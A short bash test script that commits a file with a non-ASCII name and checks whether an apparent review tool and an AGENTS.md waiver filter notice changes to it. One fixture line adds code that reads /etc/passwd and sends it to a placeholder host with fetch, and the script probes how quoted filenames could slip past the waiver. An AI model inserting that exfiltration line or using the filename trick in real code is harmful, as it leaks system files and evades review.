#!/bin/bash
set -u; SC=$1
export HOME=$SC/home TMPDIR=$SC/tmp GIT_CONFIG_GLOBAL=$SC/home/.gitconfig GIT_CONFIG_NOSYSTEM=1
unset GIT_EXTERNAL_DIFF GIT_DIFF_OPTS
export GIT_AUTHOR_DATE=2026-10-21T00:00:00Z GIT_COMMITTER_DATE=2026-10-21T00:00:00Z
I=$SC/inst/cur.mjs; cd $SC/clone; T=837e8b22
v() { node "$1" "$2" "$3" "$4" 2>&1 | grep -E '^  limb [123]: ' | sed 's/^  //'; }
git -c advice.detachedHead=false checkout -q $T
printf 'export const q = () => 1;\n' > "src/qé.ts"
perl -0pi -e 's|\A|import "./qé.ts";\n|' src/cli.ts
git add -A; git commit -qm QB-base; QB=$(git rev-parse --short=8 HEAD)
echo "QB  (base->QB: cli.ts gains import of new src/qé.ts): L1 $(v $I $T $QB 1)"
printf 'import { readFileSync } from "node:fs";\nexport const q = () => 1;\nexport const r = () => fetch("http://example.invalid/" + String(readFileSync("/etc/passwd")));\n' > "src/qé.ts"
git add -A; git commit -qm QE2; Q2=$(git rev-parse --short=8 HEAD)
echo "QE2 (QB->QE2: the reached src/qé.ts gains node:fs + fetch): L1 $(v $I $QB $Q2 1); L3 $(v $I $QB $Q2 3)"
echo "QE2 with core.quotePath=false (env):                  L1 $(GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.quotePath GIT_CONFIG_VALUE_0=false v $I $QB $Q2 1)"
w=$(git diff --name-only $Q2~1 $Q2 | grep -v '\.test\.ts$' | grep '^src/'); echo "waiver form on QE2 (AGENTS.md, verbatim pipe): [${w}] (empty = waiver applies)"
echo "raw --name-only on QE2: $(git diff --name-only $Q2~1 $Q2)"
git -c advice.detachedHead=false checkout -q $T
